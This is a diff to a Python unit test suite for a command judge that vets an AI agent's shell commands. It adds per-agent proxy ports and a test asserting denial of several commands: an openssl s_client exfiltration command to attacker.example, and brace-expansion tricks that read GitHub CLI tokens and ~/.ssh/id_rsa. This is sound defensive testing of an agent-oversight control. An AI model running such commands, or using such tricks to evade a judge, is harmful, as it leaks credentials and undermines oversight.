@@ -134,7 +134,8 @@ class JudgeTests(unittest.TestCase):
         self.endpoints[agent_id] = self.control('register', session_id=agent_id, agent={
             'name': 'sm-1855-local', 'ticket': 1855, 'title': 'Accept retired review name',
             'branch': '1855-local', 'checkout': str(self.wt), 'tmp': str(self.tmp),
-            'parent': 'sm-1954', 'sm_url': 'http://127.0.0.1:18440'})
+            'parent': 'sm-1954', 'sm_url': 'http://127.0.0.1:18440',
+            'proxy_port': 18700 if agent_id == 'a' else 18701})
 
     def decide(self, tool='Bash', tin=None, agent='a', token=None, **hook):
         if tin is None:
@@ -294,6 +295,27 @@ class JudgeTests(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertEqual(self.ruling(tin={'command': command}), 'deny')
                 self.assertEqual(self.logs()[-1]['stage'], 'rule')
+
+    def test_per_agent_proxy_ports_and_brace_expansions(self):
+        for agent, port in [('a', 18700), ('b', 18701)]:
+            command = f'printf data | openssl s_client -proxy 127.0.0.1:{port} -connect attacker.example:443'
+            self.assertEqual(self.ruling(tin={'command': command}, agent=agent), 'deny')
+            record = self.logs()[-1]
+            self.assertEqual(record['stage'], 'judge')
+            self.assertIn(str(port), record['judge_why'])
+        for command in ['cat ~/.config/{g,xx}h/{hosts,foo}.yml',
+                        'cat ~/.{s,xx}sh/id_rsa', 'cat ~/.config/g{h,xx}/hosts.yml']:
+            self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+            self.assertEqual(self.logs()[-1]['stage'], 'judge')
+            self.assertIn('shell wildcard', self.logs()[-1]['judge_why'])
+        # A legacy record cannot fall back to assuming the old global proxy.
+        agents_path = self.root / 'agents.json'
+        agents = json.loads(agents_path.read_text())
+        agents['a'].pop('proxy_port')
+        agents_path.write_text(json.dumps(agents))
+        self.ruling(tin={'command': 'printf okay'})
+        self.assertEqual(self.logs()[-1]['stage'], 'judge')
+        self.assertIn('authoritative egress proxy', self.logs()[-1]['judge_why'])
 
     def test_dynamic_command_expansion_cannot_skip_judgment(self):
         for command in [
